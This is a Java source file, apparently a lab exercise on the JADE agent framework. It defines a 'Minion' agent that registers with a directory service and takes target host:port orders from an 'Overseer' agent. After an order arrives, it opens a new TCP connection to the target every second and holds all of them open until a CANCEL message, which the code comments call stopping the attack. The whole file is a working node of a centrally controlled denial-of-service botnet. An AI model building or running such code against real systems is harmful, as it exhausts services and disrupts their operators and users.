package lab4;

import java.io.IOException;
import java.net.Socket;

import jade.core.Agent;
import jade.core.behaviours.TickerBehaviour;
import jade.domain.DFService;
import jade.domain.FIPAException;
import jade.domain.FIPAAgentManagement.DFAgentDescription;
import jade.domain.FIPAAgentManagement.ServiceDescription;
import jade.lang.acl.ACLMessage;

public class Minion extends Agent{
	BehaviourOpenTCPConnection tcpb;
    protected void setup() {    	
        System.out.println("Hello World! My name is " + getAID().getLocalName());

        tcpb = new BehaviourOpenTCPConnection(this, null, 2223);
        addBehaviour(tcpb);
        addBehaviour(new BehaviourReceiveMessage(this));
        
        registerAgent();
    }

	/** 
	 * Registration with the DF 
	 */
    protected void registerAgent(){
	    DFAgentDescription dfd = new DFAgentDescription();
	    ServiceDescription sd = new ServiceDescription();
	    sd.setType(Overseer.TYPE_MINION);
        sd.setOwnership("ExampleReceiversOfJADE");
        sd.addOntologies(Overseer.TYPE_MINION);
	    sd.setName(getName());
	    dfd.setName(getAID());
	    dfd.addServices(sd);
	    try {
	    	DFService.register(this,dfd);
	    } catch (FIPAException e) {
	        System.err.println(getLocalName()+" registration with DF unsucceeded. Reason: "+e.getMessage());
	        doDelete();
	    }
    }
    /**
     * if agent is stopped
     */
    @Override
    protected void takeDown(){
    	tcpb.onEnd(); // close connections
        try {  // deregister
        	DFService.deregister(this); 
    	}catch (Exception e) {}
    }
    
    /**
     * What to do on the receival of a message
     * @author nitzel
     *
     */
    protected class BehaviourReceiveMessage extends TickerBehaviour {
		
    	public BehaviourReceiveMessage(Agent a) {
			super(a, 100); // 100msec between the calls
		}

		public void onTick() {
            //Receive a Message
            ACLMessage msg = receive();
            if(msg != null) {
            	//System.out.println("Minion "+getLocalName()+" received message"+msg);
            	int performative = msg.getPerformative();
            	String content = msg.getContent();
            	
            	switch(performative){
            	case ACLMessage.PROPAGATE: // received new target
                	System.out.println("type propagate");
            		String[] target = content.split(":");
            		if(target.length != 2){
            			System.err.println("Minion received invalid target `"+content+"`");
            		}
            		try {
						tcpb.setTarget(target[0], Integer.parseInt(target[1]));
						//tcpb.restart();
					} catch (NumberFormatException e) {
						System.err.println("Minion can't parse port: `"+target[1]+"`");
					}
            		break;
            	case ACLMessage.CANCEL: // stop attack, delete agent
                	System.out.println("type cancel");
            		getAgent().doDelete();
            		break;
            	default:
            		System.err.println("Minion received unkown performative:"+performative+"/content"+content);
            	}
            }
		}
    }
    /**
     * Opens a tcp connection :)
     * Is runnable to be non-blocking
     * @author nitzel
     *
     */
    protected class BehaviourOpenTCPConnection extends TickerBehaviour implements Runnable{
    	String target;
    	int targetPort;
    	java.util.Vector<Socket> sockets;
    	public BehaviourOpenTCPConnection(Agent agent, String target, int targetPort) {
			super(agent, 1000); // 1000msec between the calls
			sockets = new java.util.Vector<>();
			this.setTarget(target, targetPort);
		}
    	
    	public void setTarget(String target, int targetPort){
    		this.onEnd(); // clear all connections
			this.target = target;
			this.targetPort = targetPort;
    	}
    	
		@Override
		protected void onTick() {
			//System.out.println("ticking minion");
			new Thread(this).start();
		}

		@Override
		public void run() {
			if(target == null || target.length()==0) return;
			try {
				Socket s = new Socket(target, targetPort);
				sockets.add(s);
			} catch (Exception e) {
				e.printStackTrace();
			} 
		}
		
		@Override
		public int onEnd(){
			System.out.println("ending minions ticker behaviour");
			for(Socket s : sockets){
				try {
					s.close();
				} catch (IOException e) {}
			}
			return 0;
		}
    }
}
